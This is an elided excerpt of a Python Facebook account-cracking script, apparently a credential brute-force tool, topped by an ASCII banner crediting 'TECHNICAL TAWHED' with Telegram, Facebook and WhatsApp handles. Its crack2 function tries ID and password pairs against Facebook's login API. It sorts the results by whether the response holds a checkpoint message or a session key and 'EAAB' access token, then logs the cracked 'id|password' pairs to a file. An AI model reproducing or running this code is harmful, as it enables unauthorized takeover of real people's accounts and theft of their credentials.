...
╋╋┗┛╋┗┛╋┗┛┗┛┗┛┗┛╋┗┻━━━┻━━━┛
+======================================+
| Author    : TECHNICAL TAWHED        |
| Telegram  : @Technical_Tawhed       |
| Facebook  : MRr Tawhed                    |
| TG ID     : RaYees Tawhed                   |
| Whatsapp  : +937786251942               | 
+=======================================+      
|    My Best Friend  Technical Zahid     |
|    My Best Friend  Binam Nishon        |
+=======================================+
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s   [TAWHED] %s/%s  OK/%s | CP/%s : %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s   [TAWHED] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s   [TAWHED] %s|%s        '%(h,idf,pw))
